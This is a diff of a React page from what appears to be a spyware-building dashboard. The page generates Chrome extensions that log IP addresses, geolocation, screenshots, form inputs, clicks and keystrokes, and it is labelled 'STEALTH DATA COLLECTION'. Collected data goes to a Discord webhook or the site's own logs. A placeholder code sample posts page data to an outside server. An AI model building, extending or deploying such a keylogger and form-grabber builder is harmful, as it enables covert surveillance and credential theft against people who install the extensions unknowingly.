@@ -1,29 +1,7 @@
-
-import { useState } from 'react';
-import { Button } from '@/components/ui/button';
-import { Input } from '@/components/ui/input';
-import { Textarea } from '@/components/ui/textarea';
-import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
-import { Label } from '@/components/ui/label';
-import { Badge } from '@/components/ui/badge';
-import { Alert, AlertDescription } from '@/components/ui/alert';
-import { 
-  Download, 
-  Puzzle, 
-  Code, 
-  Settings,
-  Shield,
-  Globe,
-  Monitor,
-  Camera,
-  FileText,
-  Zap,
-  CheckCircle
-} from 'lucide-react';
-import { useToast } from '@/hooks/use-toast';
-import { useAuth } from '@/contexts/AuthContext';
-import SnowEffect from '@/components/ui/snow-effect';
-import Sidebar from '@/components/dashboard/sidebar';
+import { useState } from "react";
+import { Download, Puzzle, Code, Settings, Shield, Globe, Monitor, Camera, FileText, Zap, CheckCircle, Upload, Image as ImageIcon } from "lucide-react";
+import { useToast } from "@/hooks/use-toast";
+import Sidebar from "@/components/dashboard/sidebar";
 
 interface ExtensionConfig {
   name: string;
@@ -37,427 +15,413 @@ interface ExtensionConfig {
   backgroundImage?: string;
 }
 
+const CY = {
+  font: "Orbitron, sans-serif",
+  mono: "JetBrains Mono, monospace",
+  cyan: "#00f5ff",
+  green: "#00ff9f",
+  red: "#ff5050",
+  yellow: "#ffc800",
+  purple: "#a050ff",
+  orange: "#ff6400",
+};
+
+function CyberLabel({ children }: any) {
+  return (
+    <span className="block mb-1.5 text-[9px] tracking-widest uppercase"
+      style={{ color: "rgba(0,245,255,0.4)", fontFamily: CY.font, letterSpacing: "0.2em" }}>
+      {children}
+    </span>
+  );
+}
+
+function CyberInput({ value, onChange, placeholder, type = "text", ...rest }: any) {
+  return (
+    <input type={type} value={value} onChange={onChange} placeholder={placeholder} {...rest}
+      className="w-full px-3 py-2.5 text-xs outline-none transition-all"
+      style={{ background: "rgba(0,245,255,0.04)", border: "1px solid rgba(0,245,255,0.2)", color: "#e0f8ff", fontFamily: CY.mono, fontSize: "12px" }}
+      onFocus={e => { e.currentTarget.style.borderColor = "rgba(0,245,255,0.5)"; e.currentTarget.style.boxShadow = "0 0 12px rgba(0,245,255,0.08)"; }}
+      onBlur={e => { e.currentTarget.style.borderColor = "rgba(0,245,255,0.2)"; e.currentTarget.style.boxShadow = "none"; }}
+    />
+  );
+}
+
+function CyberTextarea({ value, onChange, placeholder, rows = 4 }: any) {
+  return (
+    <textarea value={value} onChange={onChange} placeholder={placeholder} rows={rows}
+      className="w-full px-3 py-2.5 text-xs outline-none transition-all resize-none"
+      style={{ background: "rgba(0,245,255,0.04)", border: "1px solid rgba(0,245,255,0.2)", color: "#e0f8ff", fontFamily: CY.mono, fontSize: "12px" }}
+      onFocus={e => { e.currentTarget.style.borderColor = "rgba(0,245,255,0.5)"; }}
+      onBlur={e => { e.currentTarget.style.borderColor = "rgba(0,245,255,0.2)"; }}
+    />
+  );
+}
+
+function Panel({ title, icon: Icon, color = CY.cyan, children }: any) {
+  return (
+    <div style={{ background: "rgba(0,6,12,0.7)", border: `1px solid ${color}25` }}>
+      <div className="px-5 py-4 border-b flex items-center gap-2"
+        style={{ borderColor: `${color}18`, background: "rgba(0,8,20,0.6)" }}>
+        <Icon className="w-4 h-4" style={{ color, filter: `drop-shadow(0 0 4px ${color})` }} />
+        <span className="text-[11px] font-bold tracking-widest"
+          style={{ fontFamily: CY.font, color, letterSpacing: "0.2em" }}>
+          {title}
+        </span>
+      </div>
+      <div className="p-5">{children}</div>
+    </div>
+  );
+}
+
+function CyberBtn({ children, onClick, disabled, variant = "primary", size = "md" }: any) {
+  const v: Record<string, any> = {
+    primary: { bg: "rgba(0,245,255,0.1)",  border: "rgba(0,245,255,0.4)",  color: "#00f5ff" },
+    success: { bg: "rgba(0,255,159,0.08)", border: "rgba(0,255,159,0.4)",  color: "#00ff9f" },
+    purple:  { bg: "rgba(160,80,255,0.1)", border: "rgba(160,80,255,0.4)", color: "#a050ff" },
+    warning: { bg: "rgba(255,200,0,0.08)", border: "rgba(255,200,0,0.4)",  color: "#ffc800" },
+  };
+  const s = v[variant] || v.primary;
+  const sz = size === "lg" ? "px-6 py-3 text-[11px]" : "px-4 py-2.5 text-[10px]";
+  return (
+    <button onClick={onClick} disabled={disabled}
+      className={`flex items-center gap-2 ${sz} font-bold tracking-widest transition-all hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed`}
+      style={{ background: s.bg, border: `1px solid ${s.border}`, color: s.color, fontFamily: CY.font, letterSpacing: "0.15em", cursor: disabled ? "not-allowed" : "pointer" }}>
+      {children}
+    </button>
+  );
+}
+
 export default function ExtensionGenerator() {
   const [config, setConfig] = useState<ExtensionConfig>({
-    name: 'Custom IP Logger',
-    description: 'Track visitor information and activity',
-    version: '1.0.0',
-    permissions: ['activeTab', 'storage', 'tabs'],
-    features: ['ip_tracking', 'geolocation', 'browser_info'],
-    webhookUrl: '',
-    customCode: '',
+    name: "Custom IP Logger",
+    description: "Track visitor information and activity",
+    version: "1.0.0",
+    permissions: ["activeTab", "storage", "tabs"],
+    features: ["ip_tracking", "geolocation", "browser_info"],
+    webhookUrl: "",
+    customCode: "",
     profilePicture: undefined,
-    backgroundImage: undefined
+    backgroundImage: undefined,
   });
   const [isGenerating, setIsGenerating] = useState(false);
   const { toast } = useToast();
-  const { user } = useAuth();
 
   const availablePermissions = [
-    { id: 'activeTab', label: 'Active Tab', description: 'Access current tab information' },
-    { id: 'storage', label: 'Storage', description: 'Store data locally' },
-    { id: 'tabs', label: 'Tabs', description: 'Access all tabs' },
-    { id: 'cookies', label: 'Cookies', description: 'Read and modify cookies' },
-    { id: 'history', label: 'History', description: 'Access browsing history' },
-    { id: 'bookmarks', label: 'Bookmarks', description: 'Access bookmarks' },
-    { id: 'webRequest', label: 'Web Requests', description: 'Monitor network requests' },
-    { id: 'geolocation', label: 'Geolocation', description: 'Access location data' },
-    { id: 'notifications', label: 'Notifications', description: 'Show desktop notifications' }
+    { id: "activeTab",    label: "Active Tab",    desc: "Access current tab information" },
+    { id: "storage",      label: "Storage",       desc: "Store data locally" },
+    { id: "tabs",         label: "All Tabs",      desc: "Access all open tabs" },
+    { id: "cookies",      label: "Cookies",       desc: "Read and modify cookies" },
+    { id: "history",      label: "History",       desc: "Access browsing history" },
+    { id: "bookmarks",    label: "Bookmarks",     desc: "Access bookmarks" },
+    { id: "webRequest",   label: "Web Requests",  desc: "Monitor network requests" },
+    { id: "geolocation",  label: "Geolocation",   desc: "Access location data" },
+    { id: "notifications",label: "Notifications", desc: "Show desktop notifications" },
   ];
 
   const availableFeatures = [
-    { id: 'ip_tracking', label: 'IP Tracking', description: 'Log IP addresses', icon: Globe },
-    { id: 'geolocation', label: 'Geolocation', description: 'Get location data', icon: Monitor },
-    { id: 'browser_info', label: 'Browser Info', description: 'Collect browser details', icon: Settings },
-    { id: 'screenshot', label: 'Screenshots', description: 'Capture page screenshots', icon: Camera },
-    { id: 'form_data', label: 'Form Data', description: 'Track form inputs', icon: FileText },
-    { id: 'click_tracking', label: 'Click Tracking', description: 'Monitor user clicks', icon: Zap },
-    { id: 'keylogger', label: 'Keystroke Logging', description: 'Log keyboard activity', icon: Shield }
+    { id: "ip_tracking",   label: "IP Tracking",        desc: "Log IP addresses",           icon: Globe,    color: CY.cyan },
+    { id: "geolocation",   label: "Geolocation",        desc: "Get location data",          icon: Monitor,  color: CY.cyan },
+    { id: "browser_info",  label: "Browser Info",       desc: "Collect browser details",    icon: Settings, color: CY.purple },
+    { id: "screenshot",    label: "Screenshots",        desc: "Capture page screenshots",   icon: Camera,   color: CY.yellow },
+    { id: "form_data",     label: "Form Data",          desc: "Track form inputs",          icon: FileText, color: CY.green },
+    { id: "click_tracking",label: "Click Tracking",     desc: "Monitor user clicks",        icon: Zap,      color: CY.orange },
+    { id: "keylogger",     label: "Keystroke Logging",  desc: "Log keyboard activity",      icon: Shield,   color: CY.red },
   ];
 
-  const togglePermission = (permission: string) => {
+  const togglePermission = (perm: string) => {
     setConfig(prev => ({
       ...prev,
-      permissions: prev.permissions.includes(permission)
-        ? prev.permissions.filter(p => p !== permission)
-        : [...prev.permissions, permission]
+      permissions: prev.permissions.includes(perm)
+        ? prev.permissions.filter(p => p !== perm)
+        : [...prev.permissions, perm],
     }));
   };
 
-  const toggleFeature = (feature: string) => {
+  const toggleFeature = (feat: string) => {
     setConfig(prev => ({
       ...prev,
-      features: prev.features.includes(feature)
-        ? prev.features.filter(f => f !== feature)
-        : [...prev.features, feature]
+      features: prev.features.includes(feat)
+        ? prev.features.filter(f => f !== feat)
+        : [...prev.features, feat],
     }));
   };
 
   const generateExtension = async () => {
     if (!config.name.trim()) {
-      toast({
-        title: "Name Required",
-        description: "Please enter an extension name",
-        variant: "destructive"
-      });
+      toast({ title: "NAME REQUIRED", description: "Enter an extension name", variant: "destructive" });
       return;
     }
-
-    // Validate webhook URL only if provided
-    if (config.webhookUrl.trim() && !config.webhookUrl.startsWith('https://discord.com/api/webhooks/') && !config.webhookUrl.startsWith('https://discordapp.com/api/webhooks/')) {
-      toast({
-        title: "Invalid Webhook URL",
-        description: "Please enter a valid Discord webhook URL or leave empty to use EX LOGS only",
-        variant: "destructive"
-      });
+    if (config.webhookUrl.trim() && !config.webhookUrl.startsWith("https://discord.com/api/webhooks/") && !config.webhookUrl.startsWith("https://discordapp.com/api/webhooks/")) {
+      toast({ title: "INVALID WEBHOOK URL", description: "Use a valid Discord webhook URL or leave empty", variant: "destructive" });
       return;
     }
-
     setIsGenerating(true);
-
     try {
-      const token = localStorage.getItem('token');
-      if (!token) {
-        throw new Error('No authentication token found');
-      }
-
-      const response = await fetch('/api/generate-extension', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Authorization': `Bearer ${token}`
-        },
-        body: JSON.stringify(config)
+      const token = localStorage.getItem("token");
+      if (!token) throw new Error("No authentication token found");
+      const response = await fetch("/api/generate-extension", {
+        method: "POST",
+        headers: { "Content-Type": "application/json", Authorization: `Bearer ${token}` },
+        body: JSON.stringify(config),
       });
-
       if (!response.ok) {
-        const errorData = await response.json().catch(() => ({ error: 'Failed to generate extension' }));
-        throw new Error(errorData.error || 'Failed to generate extension');
+        const err = await response.json().catch(() => ({ error: "Failed to generate extension" }));
+        throw new Error(err.error || "Failed to generate extension");
       }
-
-      // Check if response is actually a zip file
-      const contentType = response.headers.get('content-type');
-      if (!contentType || !contentType.includes('application/zip')) {
-        throw new Error('Server returned invalid file format');
-      }
-
+      const contentType = response.headers.get("content-type");
+      if (!contentType?.includes("application/zip")) throw new Error("Server returned invalid file format");
       const blob = await response.blob();
-      if (blob.size === 0) {
-        throw new Error('Generated extension file is empty');
-      }
-
+      if (blob.size === 0) throw new Error("Generated extension file is empty");
       const url = window.URL.createObjectURL(blob);
-      const a = document.createElement('a');
+      const a = document.createElement("a");
       a.href = url;
-      a.download = `${config.name.replace(/\s+/g, '_').toLowerCase()}_extension.zip`;
+      a.download = `${config.name.replace(/\s+/g, "_").toLowerCase()}_extension.zip`;
       document.body.appendChild(a);
       a.click();
       window.URL.revokeObjectURL(url);
       document.body.removeChild(a);
-
-      toast({
-        title: "Extension Generated",
-        description: "Your Chrome extension has been downloaded successfully!",
-      });
+      toast({ title: "EXTENSION GENERATED", description: "Download started successfully" });
     } catch (error) {
-      console.error('Extension generation error:', error);
-      toast({
-        title: "Generation Failed",
-        description: error instanceof Error ? error.message : "Failed to generate extension. Please try again.",
-        variant: "destructive"
-      });
+      toast({ title: "GENERATION FAILED", description: error instanceof Error ? error.message : "Unknown error", variant: "destructive" });
     } finally {
       setIsGenerating(false);
     }
   };
 
+  const handleImageFile = (key: "profilePicture" | "backgroundImage") => (e: React.ChangeEvent<HTMLInputElement>) => {
+    const file = e.target.files?.[0];
+    if (!file) return;
+    const reader = new FileReader();
+    reader.onload = ev => setConfig(prev => ({ ...prev, [key]: ev.target?.result as string }));
+    reader.readAsDataURL(file);
+  };
+
   return (
-    <div className="flex h-screen bg-background relative overflow-hidden">
-      <SnowEffect color="#ffffff" glow={true} density={60} speed={1.2} />
+    <div className="flex h-screen overflow-hidden relative" style={{ background: "#000508" }}>
+      {/* Scan lines */}
+      <div className="fixed inset-0 pointer-events-none z-0 opacity-[0.015]"
+        style={{ backgroundImage: "repeating-linear-gradient(0deg,#00f5ff 0px,#00f5ff 1px,transparent 1px,transparent 4px)" }} />
+      <div className="fixed top-0 right-0 w-96 h-96 pointer-events-none z-0 opacity-10"
+        style={{ background: "radial-gradient(circle at top right, rgba(160,80,255,0.3), transparent 70%)" }} />
+
       <Sidebar />
 
-      <main className="flex-1 overflow-auto relative z-10 pb-16 md:pb-0">
-        <header className="bg-card/80 backdrop-blur-md border-b border-border px-6 py-4">
+      <main className="flex-1 overflow-auto relative z-10 pb-16 md:pb-0" style={{ minWidth: 0 }}>
+        {/* Header */}
+        <header className="sticky top-0 z-20 px-4 md:px-6 py-4 border-b"
+          style={{ background: "rgba(0,4,12,0.97)", borderColor: "rgba(160,80,255,0.2)", backdropFilter: "blur(20px)" }}>
+          <div className="absolute top-0 left-0 right-0 h-px"
+            style={{ background: "linear-gradient(90deg, transparent, rgba(160,80,255,0.6) 30%, rgba(0,245,255,0.6) 70%, transparent)" }} />
           <div className="flex items-center justify-between">
-            <div className="animate-slide-in-up">
-              <h2 className="text-2xl font-semibold text-foreground drop-shadow-lg">Extension Generator</h2>
-              <p className="text-muted-foreground">Create custom Chrome extensions for data collection</p>
+            <div className="flex items-center gap-3">
+              <Puzzle className="w-4 h-4" style={{ color: CY.purple, filter: "drop-shadow(0 0 6px rgba(160,80,255,0.8))" }} />
+              <div>
+                <h1 className="text-base md:text-lg font-black tracking-widest"
+                  style={{ fontFamily: CY.font, color: CY.purple, textShadow: "0 0 15px rgba(160,80,255,0.5)", letterSpacing: "0.2em" }}>
+                  EXTENSION GENERATOR
+                </h1>
+                <p className="text-[10px] tracking-widest" style={{ color: "rgba(0,245,255,0.4)", fontFamily: CY.mono }}>
+                  // CHROME EXTENSION BUILDER — STEALTH DATA COLLECTION
+                </p>
+              </div>
             </div>
-            <Badge className="bg-purple-500/20 text-purple-300 border-purple-500/30">
-              <Puzzle className="w-4 h-4 mr-1" />
-              Chrome Extension
-            </Badge>
+            <div className="flex items-center gap-1.5 px-2.5 py-1.5"
+              style={{ background: "rgba(160,80,255,0.08)", border: "1px solid rgba(160,80,255,0.3)" }}>
+              <Puzzle className="w-3 h-3" style={{ color: CY.purple }} />
+              <span className="text-[9px] font-bold tracking-widest" style={{ color: CY.purple, fontFamily: CY.font, letterSpacing: "0.15em" }}>
+                MV3 READY
+              </span>
+            </div>
           </div>
         </header>
 
-        <div className="p-6 space-y-6">
-          {/* Basic Configuration */}
-          <Card className="bg-black/40 backdrop-blur-md border-white/10 shadow-2xl animate-slide-in-up">
-            <CardHeader>
-              <CardTitle className="text-white flex items-center gap-2">
-                <Settings className="h-5 w-5 text-blue-400" />
-                Basic Configuration
-              </CardTitle>
-              <CardDescription className="text-gray-300">
-                Configure the basic settings for your Chrome extension
-              </CardDescription>
-            </CardHeader>
-            <CardContent className="space-y-4">
+        <div className="p-4 md:p-6 space-y-4 max-w-4xl">
+          {/* Basic Config */}
+          <Panel title="BASIC CONFIGURATION" icon={Settings} color={CY.cyan}>
+            <div className="space-y-4">
               <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                 <div>
-                  <Label htmlFor="name" className="text-gray-300">Extension Name</Label>
-                  <Input
-                    id="name"
-                    value={config.name}
-                    onChange={(e) => setConfig(prev => ({ ...prev, name: e.target.value }))}
-                    className="bg-white/5 border-white/20 text-white"
-                    placeholder="My Custom Logger"
-                  />
+                  <CyberLabel>EXTENSION NAME</CyberLabel>
+                  <CyberInput value={config.name} onChange={(e: any) => setConfig(p => ({ ...p, name: e.target.value }))} placeholder="Custom IP Logger" />
                 </div>
                 <div>
-                  <Label htmlFor="version" className="text-gray-300">Version</Label>
-                  <Input
-                    id="version"
-                    value={config.version}
-                    onChange={(e) => setConfig(prev => ({ ...prev, version: e.target.value }))}
-                    className="bg-white/5 border-white/20 text-white"
-                    placeholder="1.0.0"
-                  />
+                  <CyberLabel>VERSION</CyberLabel>
+                  <CyberInput value={config.version} onChange={(e: any) => setConfig(p => ({ ...p, version: e.target.value }))} placeholder="1.0.0" />
                 </div>
               </div>
               <div>
-                <Label htmlFor="description" className="text-gray-300">Description</Label>
-                <Textarea
-                  id="description"
-                  value={config.description}
-                  onChange={(e) => setConfig(prev => ({ ...prev, description: e.target.value }))}
-                  className="bg-white/5 border-white/20 text-white"
-                  placeholder="Describe what your extension does..."
-                  rows={3}
-                />
+                <CyberLabel>DESCRIPTION</CyberLabel>
+                <CyberTextarea value={config.description} onChange={(e: any) => setConfig(p => ({ ...p, description: e.target.value }))} placeholder="Describe what your extension does..." rows={3} />
               </div>
               <div>
-                <Label htmlFor="webhook" className="text-gray-300">Discord Webhook URL (Optional)</Label>
-                <Input
-                  id="webhook"
-                  value={config.webhookUrl}
-                  onChange={(e) => setConfig(prev => ({ ...prev, webhookUrl: e.target.value }))}
-                  className="bg-white/5 border-white/20 text-white"
-                  placeholder="https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
-                  data-testid="input-webhook"
-                />
-                <p className="text-xs text-gray-400 mt-1">
-                  Optional: Create a webhook in your Discord server to receive notifications. Leave empty to only use EX LOGS.
+                <CyberLabel>DISCORD WEBHOOK URL (OPTIONAL)</CyberLabel>
+                <CyberInput value={config.webhookUrl} onChange={(e: any) => setConfig(p => ({ ...p, webhookUrl: e.target.value }))}
+                  placeholder="https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN"
+                  data-testid="input-webhook" />
+                <p className="text-[10px] mt-1" style={{ color: "rgba(0,245,255,0.3)", fontFamily: CY.mono }}>
+                  // Leave empty to only log to EX LOGS — no Discord notifications
                 </p>
               </div>
               <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                <div>
-                  <Label htmlFor="profilePicture" className="text-gray-300">Extension Profile Picture (Optional)</Label>
-                  <Input
-                    id="profilePicture"
-                    type="file"
-                    accept="image/*"
-                    onChange={(e) => {
-                      const file = e.target.files?.[0];
-                      if (file) {
-                        const reader = new FileReader();
-                        reader.onload = (event) => {
-                          setConfig(prev => ({ ...prev, profilePicture: event.target?.result as string }));
-                        };
-                        reader.readAsDataURL(file);
-                      }
-                    }}
-                    className="bg-white/5 border-white/20 text-white file:bg-blue-500/20 file:border-0 file:text-blue-300 file:mr-2 file:px-3 file:py-1 file:rounded"
-                  />
-                  <p className="text-xs text-gray-400 mt-1">
-                    Upload any size image for the extension icon/profile picture
-                  </p>
-                </div>
-                <div>
-                  <Label htmlFor="backgroundImage" className="text-gray-300">Extension Background (Optional)</Label>
-                  <Input
-                    id="backgroundImage"
-                    type="file"
-                    accept="image/*"
-                    onChange={(e) => {
-                      const file = e.target.files?.[0];
-                      if (file) {
-                        const reader = new FileReader();
-                        reader.onload = (event) => {
-                          setConfig(prev => ({ ...prev, backgroundImage: event.target?.result as string }));
-                        };
-                        reader.readAsDataURL(file);
-                      }
-                    }}
-                    className="bg-white/5 border-white/20 text-white file:bg-purple-500/20 file:border-0 file:text-purple-300 file:mr-2 file:px-3 file:py-1 file:rounded"
-                  />
-                  <p className="text-xs text-gray-400 mt-1">
-                    Upload any size background image for the extension popup
-                  </p>
-                </div>
-              </div>
-            </CardContent>
-          </Card>
-
-          {/* Permissions */}
-          <Card className="bg-black/40 backdrop-blur-md border-white/10 shadow-2xl animate-slide-in-left">
-            <CardHeader>
-              <CardTitle className="text-white flex items-center gap-2">
-                <Shield className="h-5 w-5 text-green-400" />
-                Permissions
-              </CardTitle>
-              <CardDescription className="text-gray-300">
-                Select the permissions your extension needs
-              </CardDescription>
-            </CardHeader>
-            <CardContent>
-              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
-                {availablePermissions.map((permission) => (
-                  <div
-                    key={permission.id}
-                    onClick={() => togglePermission(permission.id)}
-                    className={`p-3 rounded-lg border cursor-pointer transition-all ${
-                      config.permissions.includes(permission.id)
-                        ? 'bg-blue-500/20 border-blue-500/50 text-blue-300'
-                        : 'bg-white/5 border-white/20 text-gray-300 hover:bg-white/10'
-                    }`}
-                  >
-                    <div className="flex items-center justify-between">
-                      <span className="font-medium">{permission.label}</span>
-                      {config.permissions.includes(permission.id) && (
-                        <CheckCircle className="h-4 w-4 text-blue-400" />
-                      )}
-                    </div>
-                    <p className="text-xs opacity-75 mt-1">{permission.description}</p>
+                {[
+                  { label: "PROFILE PICTURE (OPTIONAL)", key: "profilePicture" as const, color: CY.cyan, hint: "Extension icon/profile image" },
+                  { label: "BACKGROUND IMAGE (OPTIONAL)", key: "backgroundImage" as const, color: CY.purple, hint: "Extension popup background" },
+                ].map(({ label, key, color, hint }) => (
+                  <div key={key}>
+                    <CyberLabel>{label}</CyberLabel>
+                    <label className="flex items-center gap-2 px-3 py-2.5 cursor-pointer transition-all hover:scale-[1.01]"
+                      style={{ background: `${color}06`, border: `1px solid ${color}20` }}>
+                      <ImageIcon className="w-3.5 h-3.5 flex-shrink-0" style={{ color }} />
+                      <span className="text-[10px] flex-1" style={{ color: `${color}80`, fontFamily: CY.mono }}>
+                        {config[key] ? "IMAGE LOADED" : "CLICK TO UPLOAD"}
+                      </span>
+                      {config[key] && <CheckCircle className="w-3.5 h-3.5 flex-shrink-0" style={{ color: CY.green }} />}
+                      <input type="file" accept="image/*" className="hidden" onChange={handleImageFile(key)} />
+                    </label>
+                    <p className="text-[9px] mt-1" style={{ color: "rgba(0,245,255,0.25)", fontFamily: CY.mono }}>{hint}</p>
                   </div>
                 ))}
               </div>
-            </CardContent>
-          </Card>
+            </div>
+          </Panel>
+
+          {/* Permissions */}
+          <Panel title="PERMISSIONS" icon={Shield} color={CY.green}>
+            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-2">
+              {availablePermissions.map(p => {
+                const isActive = config.permissions.includes(p.id);
+                return (
+                  <button key={p.id} onClick={() => togglePermission(p.id)}
+                    className="p-3 text-left transition-all duration-150"
+                    style={{
+                      background: isActive ? "rgba(0,255,159,0.1)" : "rgba(0,245,255,0.03)",
+                      border: `1px solid ${isActive ? "rgba(0,255,159,0.4)" : "rgba(0,245,255,0.1)"}`,
+                      cursor: "pointer",
+                    }}>
+                    <div className="flex items-center justify-between mb-1">
+                      <span className="text-[10px] font-bold tracking-widest"
+                        style={{ color: isActive ? CY.green : "rgba(200,240,255,0.6)", fontFamily: CY.font, letterSpacing: "0.1em" }}>
+                        {p.label.toUpperCase()}
+                      </span>
+                      {isActive && <CheckCircle className="w-3 h-3 flex-shrink-0" style={{ color: CY.green }} />}
+                    </div>
+                    <p className="text-[9px]" style={{ color: "rgba(0,245,255,0.3)", fontFamily: CY.mono }}>{p.desc}</p>
+                  </button>
+                );
+              })}
+            </div>
+          </Panel>
 
           {/* Features */}
-          <Card className="bg-black/40 backdrop-blur-md border-white/10 shadow-2xl animate-slide-in-right">
-            <CardHeader>
-              <CardTitle className="text-white flex items-center gap-2">
-                <Code className="h-5 w-5 text-purple-400" />
-                Data Collection Features
-              </CardTitle>
-              <CardDescription className="text-gray-300">
-                Choose what information your extension will collect
-              </CardDescription>
-            </CardHeader>
-            <CardContent>
-              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
-                {availableFeatures.map((feature) => {
-                  const Icon = feature.icon;
-                  return (
-                    <div
-                      key={feature.id}
-                      onClick={() => toggleFeature(feature.id)}
-                      className={`p-4 rounded-lg border cursor-pointer transition-all ${
-                        config.features.includes(feature.id)
-                          ? 'bg-purple-500/20 border-purple-500/50 text-purple-300'
-                          : 'bg-white/5 border-white/20 text-gray-300 hover:bg-white/10'
-                      }`}
-                    >
-                      <div className="flex items-center gap-3">
-                        <Icon className="h-5 w-5" />
-                        <div className="flex-1">
-                          <div className="flex items-center justify-between">
-                            <span className="font-medium">{feature.label}</span>
-                            {config.features.includes(feature.id) && (
-                              <CheckCircle className="h-4 w-4 text-purple-400" />
-                            )}
-                          </div>
-                          <p className="text-xs opacity-75 mt-1">{feature.description}</p>
-                        </div>
+          <Panel title="DATA COLLECTION FEATURES" icon={Code} color={CY.purple}>
+            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-2">
+              {availableFeatures.map(f => {
+                const isActive = config.features.includes(f.id);
+                const Icon = f.icon;
+                return (
+                  <button key={f.id} onClick={() => toggleFeature(f.id)}
+                    className="p-3 text-left transition-all duration-150"
+                    style={{
+                      background: isActive ? `${f.color}10` : "rgba(0,245,255,0.03)",
+                      border: `1px solid ${isActive ? `${f.color}40` : "rgba(0,245,255,0.1)"}`,
+                      cursor: "pointer",
+                    }}>
+                    <div className="flex items-center justify-between mb-1">
+                      <div className="flex items-center gap-2">
+                        <Icon className="w-3.5 h-3.5 flex-shrink-0" style={{ color: isActive ? f.color : "rgba(0,245,255,0.3)" }} />
+                        <span className="text-[10px] font-bold tracking-widest"
+                          style={{ color: isActive ? f.color : "rgba(200,240,255,0.6)", fontFamily: CY.font, letterSpacing: "0.1em" }}>
+                          {f.label.toUpperCase()}
+                        </span>
                       </div>
+                      {isActive && <CheckCircle className="w-3 h-3 flex-shrink-0" style={{ color: f.color }} />}
                     </div>
-                  );
-                })}
-              </div>
-            </CardContent>
-          </Card>
+                    <p className="text-[9px]" style={{ color: "rgba(0,245,255,0.3)", fontFamily: CY.mono }}>{f.desc}</p>
+                  </button>
+                );
+              })}
+            </div>
+          </Panel>
 
           {/* Custom Code */}
-          <Card className="bg-black/40 backdrop-blur-md border-white/10 shadow-2xl animate-slide-in-up">
-            <CardHeader>
-              <CardTitle className="text-white flex items-center gap-2">
-                <Code className="h-5 w-5 text-yellow-400" />
-                Custom JavaScript Code
-              </CardTitle>
-              <CardDescription className="text-gray-300">
-                Add custom JavaScript code to execute in your extension (optional)
-              </CardDescription>
-            </CardHeader>
-            <CardContent>
-              <Textarea
+          <Panel title="CUSTOM JAVASCRIPT CODE" icon={Code} color={CY.yellow}>
+            <div>
+              <CyberTextarea
                 value={config.customCode}
-                onChange={(e) => setConfig(prev => ({ ...prev, customCode: e.target.value }))}
-                className="bg-white/5 border-white/20 text-white font-mono text-sm"
-                placeholder="// Add your custom JavaScript code here
+                onChange={(e: any) => setConfig(p => ({ ...p, customCode: e.target.value }))}
+                placeholder={`// Add custom JavaScript to execute in your extension
 console.log('Extension loaded!');
 
 // Example: Send custom data
 function sendCustomData() {
   const data = {
     url: window.location.href,
-    timestamp: Date.now(),
-    customField: 'your-value'
+    timestamp: Date.now()
   };
-  
-  // Send to your server
   fetch('https://your-server.com/api/track', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(data)
   });
-}"
+}`}
                 rows={12}
               />
-            </CardContent>
-          </Card>
+              <p className="text-[10px] mt-2" style={{ color: "rgba(0,245,255,0.3)", fontFamily: CY.mono }}>
+                // Custom code runs in extension context — optional
+              </p>
+            </div>
+          </Panel>
 
-          {/* Generate Button */}
-          <Card className="bg-black/40 backdrop-blur-md border-white/10 shadow-2xl animate-slide-in-up">
-            <CardContent className="pt-6">
-              <div className="flex flex-col sm:flex-row items-center justify-between gap-4">
+          {/* Generate */}
+          <Panel title="GENERATE EXTENSION" icon={Download} color={CY.green}>
+            <div className="space-y-4">
+              <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
                 <div>
-                  <h3 className="text-white font-semibold">Ready to Generate</h3>
-                  <p className="text-gray-400 text-sm">
-                    Your extension will be packaged as a ZIP file ready for Chrome installation
-                  </p>
+                  <div className="text-sm font-bold mb-1" style={{ color: "rgba(200,240,255,0.9)", fontFamily: "Rajdhani, sans-serif" }}>
+                    READY TO PACKAGE
+                  </div>
+                  <div className="text-[10px]" style={{ color: "rgba(0,245,255,0.35)", fontFamily: CY.mono }}>
+                    {config.features.length} feature{config.features.length !== 1 ? "s" : ""} · {config.permissions.length} permission{config.permissions.length !== 1 ? "s" : ""} selected
+                  </div>
                 </div>
-                <Button
-                  onClick={generateExtension}
-                  disabled={isGenerating || !config.name.trim()}
-                  className="bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 text-white"
-                  size="lg"
-                >
+                <CyberBtn onClick={generateExtension} disabled={isGenerating || !config.name.trim()} variant="success" size="lg">
                   {isGenerating ? (
                     <>
-                      <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"></div>
-                      Generating...
+                      <div className="w-3 h-3 border animate-spin" style={{ borderColor: "rgba(0,255,159,0.2)", borderTopColor: CY.green }} />
+                      GENERATING...
                     </>
                   ) : (
                     <>
-                      <Download className="mr-2 h-4 w-4" />
-                      Generate Extension
+                      <Download className="w-3.5 h-3.5" />
+                      GENERATE EXTENSION
                     </>
                   )}
-                </Button>
+                </CyberBtn>
               </div>
 
-              <Alert className="mt-4 bg-blue-900/50 border-blue-500/50">
-                <Puzzle className="h-4 w-4 text-blue-400" />
-                <AlertDescription className="text-blue-200">
-                  <strong>Installation Instructions:</strong> Once downloaded, extract the ZIP file, 
-                  open Chrome's Extension Manager (chrome://extensions/), enable Developer Mode, 
-                  and click "Load unpacked" to select the extracted folder.
-                </AlertDescription>
-              </Alert>
-            </CardContent>
-          </Card>
+              {/* Install instructions */}
+              <div className="p-4 space-y-2" style={{ background: "rgba(0,245,255,0.04)", border: "1px solid rgba(0,245,255,0.15)" }}>
+                <div className="flex items-center gap-2 mb-2">
+                  <Puzzle className="w-3 h-3" style={{ color: CY.cyan }} />
